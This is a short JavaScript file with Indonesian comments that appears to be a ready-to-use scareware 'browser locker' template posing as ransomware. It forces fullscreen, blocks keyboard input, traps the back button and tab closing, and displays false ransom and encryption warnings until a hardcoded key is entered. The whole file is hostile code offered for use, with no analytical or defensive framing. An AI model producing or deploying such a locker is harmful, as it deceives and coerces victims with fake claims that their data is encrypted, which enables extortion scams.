document.addEventListener("keydown", function(event) {
    event.preventDefault(); // Mencegah pengguna keluar dengan tombol keyboard
});

window.addEventListener("beforeunload", function (event) {
    event.returnValue = "⚠️ Your files will be lost if you leave! ⚠️";
});

function checkKey() {
    let key = document.getElementById("keyInput").value;
    let correctKey = "12092010"; // Ganti dengan key yang kamu mau

    if (key === correctKey) {
        alert("✅ System Unlocked!");
        window.location.href = "https://google.com"; // Bisa diarahkan ke mana saja
    } else {
        alert("❌ WRONG KEY! Your system is still locked!");
    }
}

// Aktifkan Fullscreen saat halaman dimuat
document.addEventListener("DOMContentLoaded", function() {
    if (document.documentElement.requestFullscreen) {
        document.documentElement.requestFullscreen();
    }
});

// Blokir tombol kembali
history.pushState(null, null, location.href);
window.onpopstate = function () {
    history.pushState(null, null, location.href);
    alert("Tidak bisa kembali! Tebusan dulu!");
};

// Cegah menutup tab
window.onbeforeunload = function () {
    return "Data Anda sedang dienkripsi! Yakin ingin keluar?";
};
